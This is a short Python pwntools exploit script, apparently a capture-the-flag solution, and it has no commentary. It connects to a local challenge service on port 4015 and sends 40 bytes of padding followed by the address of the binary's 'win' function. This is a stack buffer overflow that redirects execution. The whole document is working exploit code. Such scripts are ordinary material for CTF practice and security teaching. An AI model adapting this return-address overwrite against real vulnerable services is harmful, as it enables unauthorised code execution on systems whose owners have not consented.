#!/usr/bin/env python3
from pwn import *

exe = ELF('./attachment/hore')
context.binary = exe

offset = 40
p = remote('127.0.0.1', 4015)
win = exe.symbols['win']

payload = b'A' * offset + p64(win)

p.recvuntil(b'Enter input:')
p.sendline(payload)
print(p.recvrepeat(timeout=1).decode(errors='ignore'))

